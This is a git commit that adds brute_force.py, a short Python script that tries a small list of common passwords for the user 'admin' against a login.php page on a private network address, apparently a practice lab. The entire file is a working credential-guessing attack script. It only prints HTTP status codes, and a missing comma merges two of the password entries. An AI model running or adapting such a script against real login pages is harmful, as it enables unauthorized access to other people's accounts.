a466be8c329b973fcd899a251cd2636d05d591f2
ismael107 <82840757+ismael107@users.noreply.github.com>
2026-02-07 18:28:51 +0100

    Add files via upload

---
+++ brute_force.py
@@ -0,0 +1,35 @@
+import requests
+import time
+
+url = "http://192.168.1.97:8080/login.php"
+
+user = "admin"
+passwords = [
+    "123456",
+    "passw",
+    "admin",
+    "panticora",
+    "quer",
+    "admin123",
+    "torcido"
+    "bandido"
+]
+
+headers = {
+    "User-Agent": "Mozilla/5.0"
+}
+
+session = requests.Session()
+
+for pwd in passwords:
+    data = {
+        "username": user,
+        "password": pwd,
+        "Login": "Login"
+    }
+
+    r = session.post(url, data=data, headers=headers, allow_redirects=False)
+
+    print(f"[+] Trying {user}:{pwd} -> Status {r.status_code}")
+
+    time.sleep(2) 
